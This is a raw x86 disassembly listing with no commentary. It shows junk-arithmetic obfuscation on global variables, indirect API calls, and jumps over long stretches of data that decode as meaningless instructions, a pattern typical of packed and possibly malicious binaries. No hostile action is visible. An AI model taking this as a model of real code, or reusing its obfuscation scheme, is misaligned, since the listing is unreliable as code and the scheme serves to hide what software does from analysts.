  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x4281ef,0x42815b
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x42814f,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x42834f
  418409:	or     DWORD PTR ds:0x428347,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42811f,0x4282e7
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x4281eb,0x0
  418430:	mov    DWORD PTR ds:0x4281fb,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x428343,0x5a59
  41844e:	cmp    DWORD PTR ds:0x4281eb,0x0
  418455:	jl     0x41847f
  41845b:	push   0x428043
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428da8
  41846b:	sbb    DWORD PTR ds:0x42822f,0x4c8f
  418475:	mov    DWORD PTR ds:0x428127,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x428343
  418485:	xor    ecx,DWORD PTR ds:0x4282ab
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x428347,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x4282bf,0x42822b
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x428367,0x4281ef
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x4282bb,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	fwait
  4184f8:	xchg   edx,eax
  4184f9:	lahf   
  4184fa:	jo     0x4184f2
  4184fc:	rcl    DWORD PTR [esi],1
  4184fe:	sbb    BYTE PTR [edx+edx*1-0xa88e7e8],bh
  418505:	ss xor ch,cl
  418508:	ins    DWORD PTR es:[edi],dx
  418509:	inc    ebp
  41850a:	xor    eax,0x410435af
  41850f:	mov    eax,0xd2b9dfd2
  418514:	adc    ebp,DWORD PTR [eax-0x4262fd79]
  41851a:	sub    eax,0xc7df1983
  41851f:	push   ebx
  418520:	sbb    BYTE PTR [ebx+0x29],dl
  418523:	shl    cl,1
  418525:	int    0x3
  418527:	mov    DWORD PTR [edi],edi
  418529:	lahf   
  41852a:	cld    
  41852b:	scas   eax,DWORD PTR es:[edi]
  41852c:	jns    0x4184b1
  41852e:	pop    eax
  41852f:	cmp    al,0x77
  418531:	lods   al,BYTE PTR ds:[esi]
  418532:	stos   BYTE PTR es:[edi],al
  418533:	cmp    BYTE PTR [eax+0x3d9cd6fd],0xa9
  41853a:	call   DWORD PTR [ebx-0xe]
  41853d:	stos   BYTE PTR es:[edi],al
  41853e:	loop   0x418560
  418540:	popa   
  418541:	adc    ch,BYTE PTR [edx+0x70]
  418544:	std    
  418545:	push   edx
  418546:	add    ax,0x4f32
  41854a:	add    BYTE PTR [ecx+0x11f65370],dl
  418550:	xor    BYTE PTR [eax],ah
  418552:	push   ebx
  418553:	imul   edi,ebp,0x6fdb887e
  418559:	repz inc edi
  41855b:	fild   DWORD PTR [edi]
  41855d:	inc    edi
  41855e:	lds    ebp,FWORD PTR [ecx+ecx*2-0x48809e8b]
  418565:	sbb    DWORD PTR [eax+0x61],esi
  418568:	shl    BYTE PTR [ebx+eax*2],1
  41856b:	jp     0x418507
  41856d:	cld    
  41856e:	dec    ecx
  41856f:	jo     0x418549
  418571:	lahf   
  418572:	in     al,0xd8
  418574:	call   0x3882f874
  418579:	xor    BYTE PTR [ecx],0xf
  41857c:	mov    WORD PTR [ebp+0x51],cs
  41857f:	cmp    eax,0xd53c6949
  418584:	mov    bl,0x8b
  418586:	fbld   TBYTE PTR [ebx-0x78]
  418589:	je     0x4185af
  41858b:	mov    cl,0x48
  41858d:	je     0x418525
  41858f:	sub    edi,DWORD PTR [edx-0x5d2ee5ea]
  418595:	add    eax,0xc0d411e8
  41859a:	xchg   esp,eax
  41859b:	sub    BYTE PTR fs:[ebx],al
  41859e:	adc    eax,0xf8795063
  4185a3:	sub    edi,DWORD PTR [esi+0x3dc03cb8]
  4185a9:	iret   
  4185aa:	and    eax,0x57525aa0
  4185af:	pop    esp
  4185b0:	(bad)  cs:[ebx-0x74ac9317]
  4185b7:	fidiv  DWORD PTR [eax+0xd6218cf]
  4185bd:	mov    esp,DWORD PTR [ebx-0x28]
  4185c0:	jno    0x418588
  4185c2:	call   0xb4ab9aec
  4185c7:	and    eax,0xa55f7f96
  4185cc:	cli    
  4185cd:	outs   dx,BYTE PTR ds:[esi]
  4185ce:	sti    
  4185cf:	jnp    0x418578
  4185d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185d2:	inc    esp
  4185d3:	scas   al,BYTE PTR es:[edi]
  4185d4:	inc    edx
  4185d5:	mov    edx,0x13a89cfd
  4185da:	pushf  
  4185db:	jmp    0x43a3:0xf2e8303e
  4185e2:	out    0x4e,eax
  4185e4:	ins    DWORD PTR es:[edi],dx
  4185e5:	jns    0x41863a
  4185e7:	mov    ds:0xf7ad18e8,al
  4185ec:	inc    ebx
  4185ed:	loop   0x41864e
  4185ef:	inc    esp
  4185f0:	into   
  4185f1:	add    bl,BYTE PTR [ebp+0x15]
  4185f4:	xlat   BYTE PTR ds:[ebx]
  4185f5:	dec    edx
  4185f6:	test   al,0xbf
  4185f8:	mov    ds:0x1b7ebb73,eax
  4185fd:	dec    ebp
  4185fe:	add    DWORD PTR [edi+ecx*1],eax
  418601:	pop    esi
  418602:	fldenv [edi]
  418604:	loopne 0x41861b
  418606:	cld    
  418607:	mov    bl,0x7
  418609:	nop
  41860a:	inc    esp
  41860b:	or     DWORD PTR [esi+0x55],edx
  41860e:	add    eax,0xeb8b3d83
  418613:	mov    dh,0x5b
  418615:	into   
  418616:	inc    ebx
  418617:	ins    BYTE PTR es:[edi],dx
  418618:	jmp    0x4185a4
  41861a:	mov    dl,0x1e
  41861c:	mov    ds:0xa6ada63e,al
  418621:	xchg   DWORD PTR [ebx-0x1e],ecx
  418624:	add    BYTE PTR [ecx-0x6a],al
  418627:	mov    ds:0x67040516,al
  41862c:	cwde   
  41862d:	ficom  WORD PTR [ecx]
  41862f:	inc    esp
  418630:	inc    eax
  418631:	call   0x106dd5b6
  418636:	retf   
  418637:	fist   WORD PTR ss:[edx]
  41863a:	xchg   DWORD PTR [ebp+0x5dada758],ecx
  418640:	aaa    
  418641:	push   0x1
  418643:	xor    bh,ah
  418645:	stos   BYTE PTR es:[edi],al
  418646:	add    BYTE PTR [edx+esi*4+0x5a],bh
  41864a:	and    ebp,ebx
  41864c:	dec    esi
  41864d:	retf   
  41864e:	outs   dx,BYTE PTR ds:[esi]
  41864f:	daa    
  418650:	adc    DWORD PTR [ebp-0x58],0xa31d18d0
  418657:	out    dx,eax
  418658:	adc    eax,0xf6c560b8
  41865d:	add    BYTE PTR [edi+0x247c7487],ch
  418663:	jp     0x418693
  418665:	or     ch,bh
  418667:	mov    al,0x1
  418669:	mov    bl,0xf3
  41866b:	call   FWORD PTR [ecx+edi*1]
  41866e:	and    edx,DWORD PTR [ecx-0x1be09e41]
  418674:	jo     0x4186e4
  418676:	adc    cl,ah
  418678:	fs jmp ecx
  41867b:	test   al,0x8
  41867d:	or     eax,0xbfcc47b8
  418682:	mov    eax,ds:0xdc89ff3e
  418687:	(bad)  
  418688:	mov    DWORD PTR [ecx+0x2f05a79],eax
  41868e:	outs   dx,DWORD PTR ds:[esi]
  41868f:	add    ecx,DWORD PTR ds:0x65aa5954
  418695:	cmp    eax,0xef7abab4
  41869a:	sub    DWORD PTR [esi],ebx
  41869c:	mov    cs,ebx
  41869e:	stc    
  41869f:	clc    
  4186a0:	mov    ah,0x3c
  4186a2:	nop
  4186a3:	jge    0x418707
  4186a5:	in     al,0xb1
  4186a7:	sbb    BYTE PTR [esi+0x12],bh
  4186aa:	shr    DWORD PTR [ebx-0x60],0x26
  4186ae:	and    ch,BYTE PTR ds:0xb4c89368
  4186b4:	sbb    esp,ecx
  4186b6:	jbe    0x41863c
  4186b8:	data16 cli 
  4186ba:	jns    0x418647
  4186bc:	cmp    esi,DWORD PTR [edi+0x73]
  4186bf:	je     0x41873b
  4186c1:	je     0x418679
  4186c3:	stos   DWORD PTR es:[edi],eax
  4186c4:	and    bl,0x94
  4186c7:	pop    esi
  4186c8:	inc    eax
  4186c9:	add    DWORD PTR ds:0x6dbaecad,edi
  4186cf:	in     eax,dx
  4186d0:	pop    edi
  4186d1:	ret    0x2a6c
  4186d4:	dec    edi
  4186d5:	leave  
  4186d6:	popf   
  4186d7:	in     eax,dx
  4186d8:	fbld   TBYTE PTR [edx-0xb05fe5]
  4186de:	or     al,0x3c
  4186e0:	jg     0x4186bc
  4186e2:	dec    edx
  4186e3:	add    eax,0x51c91cda
  4186e8:	lods   eax,DWORD PTR ds:[esi]
  4186e9:	add    BYTE PTR [edi-0x6282d286],dh
  4186ef:	mov    eax,ds:0x217e74c7
  4186f4:	call   0x62d7:0x7306f805
  4186fb:	je     0x4186e2
  4186fd:	out    0x43,eax
  4186ff:	in     al,dx
  418700:	out    0xbe,al
  418702:	push   ebx
  418703:	dec    edx
  418704:	sub    ecx,DWORD PTR [ebx]
  418706:	sub    eax,0x2907cab7
  41870b:	adc    eax,0x62eb3c12
  418710:	mov    ds:0xf7d092bf,al
  418715:	retf   0x76d9
  418718:	in     eax,0x25
  41871a:	test   al,0xd7
  41871c:	leave  
  41871d:	mov    eax,ds:0xdbe29088
  418722:	aam    0xb4
  418724:	sub    eax,0xad104e3b
  418729:	lds    eax,FWORD PTR [ebp-0x4c609ff0]
  41872f:	xor    eax,0xedc5a72f
  418734:	sub    al,BYTE PTR [esi-0xf]
  418737:	or     edi,DWORD PTR [ecx-0x48327d4]
  41873d:	(bad)  
  41873e:	sbb    DWORD PTR [esi+0x1a],0xffffffbe
  418742:	hlt    
  418743:	cmp    DWORD PTR [esi-0xf3ee7d3],ecx
  418749:	and    BYTE PTR [ebx],bh
  41874b:	lahf   
  41874c:	xor    ebx,DWORD PTR [ebp-0x3d]
  41874f:	jecxz  0x4187b4
  418751:	int    0x93
  418753:	leave  
  418754:	rcl    BYTE PTR [esi],cl
  418756:	push   es
  418757:	int    0x17
  418759:	es jns 0x4187bd
  41875c:	fld    DWORD PTR [esi]
  41875e:	leave  
  41875f:	mov    dl,0x2d
  418761:	ja     0x4187cd
  418763:	aaa    
  418764:	in     al,0x49
  418766:	cmp    bh,dh
  418768:	iret   
  418769:	mov    eax,ds:0xc4c7363b
  41876e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41876f:	and    al,0xfa
  418771:	xor    al,0x46
  418773:	mov    edi,esi
  418775:	and    DWORD PTR [esp+eax*2+0x12f18565],ebp
  41877c:	lds    edi,FWORD PTR [ecx+edi*4]
  41877f:	test   BYTE PTR [ebx],al
  418781:	(bad)  
  418782:	mov    ebx,0x8f6e79ae
  418787:	adc    al,0x78
  418789:	test   BYTE PTR [ebx+0x2be20a9b],bl
  41878f:	rol    DWORD PTR ds:0xa9a293d3,1
  418795:	repz add DWORD PTR [ebp-0x1aa1787f],esi
  41879c:	xchg   BYTE PTR [edx+ebp*2-0x45],dl
  4187a0:	push   ds
  4187a1:	and    eax,0x13e6781
  4187a6:	sti    
  4187a7:	arpl   WORD PTR [edx-0x462bcf41],sp
  4187ad:	inc    esp
  4187ae:	jge    0x4187d2
  4187b0:	mov    edi,0x32d99e74
  4187b5:	dec    edx
  4187b6:	and    BYTE PTR [eax-0x1f494f6a],cl
  4187bc:	dec    edi
  4187bd:	dec    eax
  4187be:	pop    eax
  4187bf:	dec    esi
  4187c0:	ins    BYTE PTR es:[edi],dx
  4187c1:	push   0xffffffbf
  4187c3:	jg     0x41880d
  4187c5:	xor    DWORD PTR [esi],eax
  4187c7:	les    ebx,FWORD PTR [ebp+0x5d]
  4187ca:	ss ffreep st(3)
  4187cd:	sbb    eax,DWORD PTR [eax-0x29]
  4187d0:	ja     0x4187b0
  4187d2:	out    dx,al
  4187d3:	add    dl,BYTE PTR [eax]
  4187d5:	pop    esp
  4187d6:	lock sbb bl,BYTE PTR [edx]
  4187d9:	cmc    
  4187da:	ret    
  4187db:	retf   
  4187dc:	ds out dx,al
  4187de:	cmp    al,0xe
  4187e0:	mov    esi,esp
  4187e2:	fsub   st(7),st
  4187e4:	cmp    ecx,DWORD PTR [eax]
  4187e6:	and    eax,0xebf0bd8f
  4187eb:	sbb    ah,al
  4187ed:	int    0x28
  4187ef:	pop    eax
  4187f0:	je     0x4187da
  4187f2:	in     eax,0x18
  4187f4:	outs   dx,DWORD PTR ds:[esi]
  4187f5:	std    
  4187f6:	jns    0x4187c8
  4187f8:	cmp    ebp,esp
  4187fa:	fiadd  WORD PTR [esi-0x762cdc9b]
  418800:	in     al,0x2c
  418802:	outs   dx,DWORD PTR ds:[esi]
  418803:	stos   BYTE PTR es:[edi],al
  418804:	dec    si
  418806:	cdq    
  418807:	mov    al,0x31
  418809:	retf   
  41880a:	pop    ss
  41880b:	sub    al,0xc4
  41880d:	popa   
  41880e:	repnz sub DWORD PTR [esi-0x24e9ee4e],edi
  418815:	or     edx,0xffffffb0
  418818:	sub    al,0x3c
  41881a:	xchg   ecx,eax
  41881b:	popa   
  41881c:	mov    ebx,0xb105f62
  418821:	mov    gs,WORD PTR [ebx+0x78f8d9b6]
  418827:	xchg   ebp,eax
  418828:	les    ebp,FWORD PTR [edi+0x574575b2]
  41882e:	push   ecx
  41882f:	out    0x56,al
  418831:	loopne 0x41889f
  418833:	ret    0xa95c
  418836:	outs   dx,DWORD PTR ds:[esi]
  418837:	in     al,dx
  418838:	and    ebx,0x5d76d6e5
  41883e:	mov    ebx,0x65025d78
  418843:	pop    edx
  418844:	sahf   
  418845:	retf   
  418846:	mov    ebp,0xc77fed28
  41884b:	sbb    edi,DWORD PTR [ecx-0x588e13e2]
  418851:	(bad)  
  418852:	cmp    eax,0x36ebb388
  418857:	stos   BYTE PTR es:[edi],al
  418858:	ret    0x62c6
  41885b:	arpl   bp,sp
  41885d:	ret    0xb16e
  418860:	test   BYTE PTR [edi-0x4e],0x96
  418864:	cmp    esi,DWORD PTR [eax-0x77]
  418867:	inc    esp
  418868:	and    al,0xa7
  41886a:	mov    edi,0x62cf2965
  41886f:	push   ds
  418870:	leave  
  418871:	adc    BYTE PTR [ebx],0x28
  418874:	arpl   WORD PTR [ecx],dx
  418876:	pop    esi
  418877:	ins    BYTE PTR es:[edi],dx
  418878:	inc    edi
  418879:	dec    BYTE PTR [edx+edi*4-0x40e28354]
  418880:	mov    ds:0x95eeb455,eax
  418885:	or     ch,dh
  418887:	dec    ecx
  418888:	lea    edi,[ecx]
  41888a:	or     dl,BYTE PTR [esi]
  41888c:	add    eax,0xd03582ba
  418891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418892:	into   
  418893:	lods   al,BYTE PTR ds:[esi]
  418894:	and    al,0x27
  418896:	(bad)  
  418898:	sti    
  418899:	inc    edi
  41889a:	lock fbstp TBYTE PTR [ecx]
  41889d:	mov    WORD PTR [ecx+ebx*2-0x63807f63],gs
  4188a4:	pop    ebp
  4188a5:	out    0x8a,al
  4188a7:	int    0xfd
  4188a9:	stc    
  4188aa:	and    DWORD PTR [edx+ebx*1],ecx
  4188ad:	adc    esi,edx
  4188af:	lahf   
  4188b0:	push   esi
  4188b1:	pushf  
  4188b2:	adc    al,BYTE PTR [ecx-0x62]
  4188b5:	mov    ecx,DWORD PTR [esp+0x48]
  4188b9:	or     DWORD PTR ds:0x4281fb,0x4281eb
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428113
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428203,0x42825b
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x42814f,0x428253
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x4281ff,0x42833f
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x42823b,0x7154
  418909:	call   DWORD PTR ds:0x428d68
  41890f:	or     DWORD PTR ds:0x428253,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x428357,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x4282df,0x0
  418935:	mov    DWORD PTR ds:0x4282bf,ebx
  41893b:	mov    DWORD PTR ds:0x428243,ebx
  418941:	mov    esi,DWORD PTR ds:0x428213
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x4282df,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428dac
  41896e:	movzx  esi,WORD PTR ds:0x4282e3
  418975:	sbb    DWORD PTR ds:0x428123,esi
  41897b:	adc    DWORD PTR ds:0x42832f,0x5f0e
  418985:	xor    DWORD PTR ds:0x428367,ebx
  41898b:	mov    esi,DWORD PTR ds:0x4281f7
  418991:	xor    esi,DWORD PTR ds:0x428133
  418997:	mov    DWORD PTR ds:0x4281f7,esi
  41899d:	add    DWORD PTR ds:0x428207,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x428363,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x42833b,0x4281fb
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x428123,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x4282db,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x428263
  4189ec:	mov    edx,DWORD PTR ds:0x4281eb
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x428363,0x606f
  418a03:	mov    DWORD PTR ds:0x42813f,ebx
  418a09:	cmp    DWORD PTR ds:0x4282db,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428db0
  418a1c:	adc    DWORD PTR ds:0x42811b,ebx
  418a22:	or     DWORD PTR ds:0x42821f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x4281cf
  418a34:	mov    edx,DWORD PTR ds:0x4282f3
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x4282e3
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x428267,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x428363,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x42823b,0x11c5
  418a73:	mov    DWORD PTR ds:0x428357,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42811b
  418a85:	mov    eax,ds:0x42825b
  418a8a:	cmp    DWORD PTR ds:0x428363,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428e50
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x428333,0x4bc8
  418aba:	sub    DWORD PTR ds:0x428243,edi
  418ac0:	or     DWORD PTR ds:0x42823b,0x2abb
  418aca:	sbb    DWORD PTR ds:0x42832f,ebx
  418ad0:	mov    eax,ds:0x422518
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x42813b,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0x77b0b184
  418af3:	ss cld 
  418af5:	mov    esi,0x1816cb9a
  418afa:	mov    esp,0x48181812
  418aff:	arpl   WORD PTR [edi-0x724cec08],bx
  418b05:	mov    bh,0x8f
  418b07:	stos   BYTE PTR es:[edi],al
  418b08:	aas    
  418b09:	jnp    0x418b2a
  418b0b:	cli    
  418b0c:	pop    ds
  418b0d:	into   
  418b0e:	aam    0x1a
  418b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b11:	cs repnz arpl dx,dx
  418b15:	adc    bh,BYTE PTR [ecx]
  418b17:	add    edx,ebp
  418b19:	inc    esp
  418b1a:	adc    BYTE PTR [edi+0x7],0x8a
  418b1e:	sar    DWORD PTR [eax-0x10],cl
  418b21:	xor    DWORD PTR ds:0x331389c2,eax
  418b27:	cld    
  418b28:	mov    ecx,0xfcc6da1
  418b2d:	in     eax,dx
  418b2e:	xor    al,0xcb
  418b30:	push   eax
  418b31:	popa   
  418b32:	jle    0x418b5c
  418b34:	cmp    ebp,DWORD PTR [ebx+0x2a154912]
  418b3a:	push   0xffffffb5
  418b3c:	dec    ecx
  418b3d:	or     edi,DWORD PTR [edx+0x539e964e]
  418b43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b44:	dec    esp
  418b45:	in     eax,dx
  418b46:	retf   
  418b47:	(bad)  
  418b48:	xlat   BYTE PTR ds:[ebx]
  418b49:	push   ss
  418b4a:	push   edx
  418b4b:	or     ecx,DWORD PTR [ebx]
  418b4d:	sub    al,0xe
  418b4f:	mov    eax,ds:0xcedf3d1b
  418b54:	sahf   
  418b55:	imul   ebx,DWORD PTR [eax+0x5d5e7921],0xc8aa5642
  418b5f:	sub    BYTE PTR [ecx+esi*4],bl
  418b62:	aad    0x56
  418b64:	mov    ds:0xfc3d48f9,eax
  418b69:	(bad)  
  418b6a:	out    0xbc,al
  418b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b6d:	and    ecx,DWORD PTR [edx-0x2d791dc9]
  418b73:	adc    ch,ch
  418b75:	repnz or edx,ebp
  418b78:	test   cl,ch
  418b7a:	jnp    0x418bc4
  418b7c:	jbe    0x418b5e
  418b7e:	cmc    
  418b7f:	fild   DWORD PTR [ecx]
  418b81:	sbb    cl,BYTE PTR [ebx+0x70]
  418b84:	jne    0x418b6c
  418b86:	popf   
  418b87:	gs ins DWORD PTR es:[edi],dx
  418b89:	pop    ebp
  418b8a:	adc    eax,0xe67855e4
  418b8f:	aas    
  418b90:	jl     0x418bfd
  418b92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b93:	xchg   esp,eax
  418b94:	mov    gs,WORD PTR ds:0x65cd0e40
  418b9a:	neg    ebp
  418b9c:	mov    eax,ds:0x7efc1c89
  418ba1:	les    ebp,FWORD PTR [ebx]
  418ba3:	mov    al,ds:0x7a49a371
  418ba8:	loope  0x418c0d
  418baa:	mov    cl,0xfe
  418bac:	mov    DWORD PTR [ebp+0x61e20e9c],edx
  418bb2:	sbb    al,BYTE PTR [eax-0x60]
  418bb5:	jl     0x418c0f
  418bb7:	test   al,0x53
  418bb9:	aad    0x54
  418bbb:	fsubr  st(7),st
  418bbd:	push   esi
  418bbe:	mov    cs,WORD PTR [ebx-0x43]
  418bc1:	mov    WORD PTR [ecx+ebp*4],?
  418bc4:	repnz mov al,0x7b
  418bc7:	pushf  
  418bc8:	fstp   QWORD PTR [esi+esi*1+0x3ed28131]
  418bcf:	inc    esp
  418bd0:	xor    ebp,DWORD PTR [ecx+0x51]
  418bd3:	xchg   edi,eax
  418bd4:	mov    BYTE PTR [ebx],al
  418bd6:	loope  0x418b8b
  418bd8:	add    al,0x37
  418bda:	cdq    
  418bdb:	das    
  418bdc:	mov    ebp,0xae6d44ab
  418be1:	call   0x9757:0xd61c75e2
  418be8:	test   DWORD PTR [edx+0x3c],eax
  418beb:	cmc    
  418bec:	mov    ds:0xf94b77c7,eax
  418bf1:	xor    ah,BYTE PTR [ebx+0xb810024]
  418bf7:	icebp  
  418bf8:	xor    edi,ebx
  418bfa:	ds (bad) 
  418bfd:	lods   al,BYTE PTR ds:[esi]
  418bfe:	scas   al,BYTE PTR es:[edi]
  418bff:	ins    BYTE PTR es:[edi],dx
  418c00:	dec    ebp
  418c01:	(bad)  
  418c02:	jmp    DWORD PTR [esi-0x1f]
  418c05:	lods   eax,DWORD PTR ds:[esi]
  418c06:	aam    0x6d
  418c08:	adc    eax,esi
  418c0a:	xchg   edx,eax
  418c0b:	pop    esp
  418c0c:	out    0xa3,al
  418c0e:	jmp    0x418c02
  418c10:	pop    ecx
  418c11:	mov    bl,0xde
  418c13:	out    0x6c,eax
  418c15:	arpl   WORD PTR [ecx-0x42c42de1],ax
  418c1b:	jae    0x418c95
  418c1d:	xchg   edx,eax
  418c1e:	adc    al,0x7c
  418c20:	and    dh,BYTE PTR [esi+0x53]
  418c23:	pushf  
  418c24:	inc    ebx
  418c25:	aas    
  418c26:	test   eax,0x8dbfc964
  418c2b:	ret    0x1bfe
  418c2e:	dec    WORD PTR [esp+edi*8]
  418c32:	xchg   ecx,eax
  418c33:	add    eax,0x51a89ebc
  418c38:	arpl   WORD PTR [edi-0x2a8c67ea],sp
  418c3e:	ror    ch,cl
  418c40:	mov    ss,WORD PTR [esi]
  418c42:	xchg   esp,eax
  418c43:	jns    0x418c2a
  418c45:	xor    al,0xbe
  418c47:	adc    BYTE PTR [ebx+0x5f09b9ce],0xd0
  418c4e:	es jbe 0x418c0a
  418c51:	and    bh,cl
  418c53:	dec    eax
  418c54:	xchg   edx,eax
  418c55:	lea    esp,[ebx+0x31]
  418c58:	outs   dx,BYTE PTR ds:[esi]
  418c59:	scas   al,BYTE PTR es:[edi]
  418c5a:	cli    
  418c5b:	mov    cs,WORD PTR [ebx-0x5c3ce42a]
  418c61:	dec    edi
  418c62:	dec    ebx
  418c63:	xchg   esp,eax
  418c64:	popf   
  418c65:	add    dh,dh
  418c67:	mov    dh,0x3b
  418c69:	jmp    0xbba5:0xaccbd921
  418c70:	adc    bh,BYTE PTR [ebp+0x6e]
  418c73:	mov    al,ds:0x910138f7
  418c78:	aas    
  418c79:	or     eax,0xaabe1069
  418c7e:	jecxz  0x418c16
  418c80:	retf   0x3ff
  418c83:	adc    bh,al
  418c85:	push   0xa921bd87
  418c8a:	imul   DWORD PTR [ebx-0x55]
  418c8d:	stc    
  418c8e:	xchg   edx,eax
  418c8f:	stos   BYTE PTR es:[edi],al
  418c90:	mov    edi,0xf2738675
  418c95:	icebp  
  418c96:	cmp    DWORD PTR [ebx-0x29],0x7bcc5bdd
  418c9d:	call   0xc1f48a14
  418ca2:	add    al,0xf6
  418ca4:	jle    0x418c72
  418ca6:	jl     0x418c44
  418ca8:	jbe    0x418ce4
  418caa:	jae    0x418c4f
  418cac:	sbb    esi,esi
  418cae:	fnstsw WORD PTR [esi+esi*1+0x20]
  418cb2:	popa   
  418cb3:	inc    ebp
  418cb4:	jne    0x418c9c
  418cb6:	fadd   QWORD PTR [edx-0x73]
  418cb9:	inc    DWORD PTR [ebp-0x3f4787b6]
  418cbf:	pop    esi
  418cc0:	out    dx,al
  418cc1:	push   ebx
  418cc2:	aad    0xaf
  418cc4:	sbb    ah,ch
  418cc6:	test   eax,0x9a632f26
  418ccb:	femms  
  418ccd:	nop    DWORD PTR [ebx+0x74089a4d]
  418cd4:	popf   
  418cd5:	xchg   ebx,eax
  418cd6:	imul   esp,DWORD PTR [ebp-0x70],0x70ee90a4
  418cdd:	dec    ebx
  418cde:	test   DWORD PTR [ebp-0x2a],edi
  418ce1:	inc    eax
  418ce2:	or     ah,bl
  418ce4:	(bad)  
  418ce5:	in     eax,0x48
  418ce7:	mov    esi,0xd286f954
  418cec:	cli    
  418ced:	(bad)  
  418cee:	cwde   
  418cef:	sahf   
  418cf0:	jg     0x418c75
  418cf2:	pop    ebp
  418cf3:	inc    eax
  418cf4:	xchg   esi,eax
  418cf5:	or     esp,DWORD PTR [ebp-0x24674006]
  418cfb:	adc    al,0xfc
  418cfd:	je     0x418c99
  418cff:	adc    ebx,DWORD PTR [ebp-0x29]
  418d02:	cdq    
  418d03:	push   0x1f13440c
  418d08:	add    eax,DWORD PTR [ecx+0x5e532148]
  418d0e:	outs   dx,DWORD PTR ds:[esi]
  418d0f:	add    ebp,ecx
  418d11:	shr    bh,0x68
  418d14:	shr    DWORD PTR ds:0x41530ff0,0xb7
  418d1b:	(bad)  
  418d1d:	xor    eax,0x47727924
  418d22:	push   esp
  418d23:	loop   0x418d6f
  418d25:	adc    edi,DWORD PTR [ecx]
  418d27:	and    dh,BYTE PTR [esi+0x2a]
  418d2a:	pop    ebp
  418d2b:	adc    DWORD PTR [edx-0x43],edi
  418d2e:	iret   
  418d2f:	adc    eax,DWORD PTR [edi+ecx*4]
  418d32:	aam    0xf8
  418d34:	adc    ebx,esi
  418d36:	jmp    0x6d9a:0x5af907ef
  418d3d:	int3   
